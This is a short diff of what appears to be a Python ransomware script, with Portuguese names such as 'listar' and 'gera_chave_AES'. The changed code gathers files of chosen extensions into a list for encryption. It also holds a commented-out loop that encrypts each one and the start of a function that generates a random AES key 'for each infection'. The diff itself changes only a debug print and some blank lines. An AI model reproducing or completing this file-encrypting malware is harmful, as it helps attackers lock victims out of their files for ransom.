@@ -109,7 +109,8 @@ def listar(chave_AES,diretorio, tipos_arq):
                 for ext in tipos_arq:
                     if(extensao[1] == ext): # found file with the extension
                         encrypt_list.append(file_found)
-    print(len(encrypt_list))
+    print(encrypt_list)
+
 '''
     for element in encrypt_list: # encrypt happens here
         try:
@@ -117,6 +118,8 @@ def listar(chave_AES,diretorio, tipos_arq):
         except:
             print('Error Encrypting file: '+ element)
 '''
+
+
 # Generate random AES key for each infection
 def gera_chave_AES():
     caminho = os.environ['HOME']+'/Desktop/'
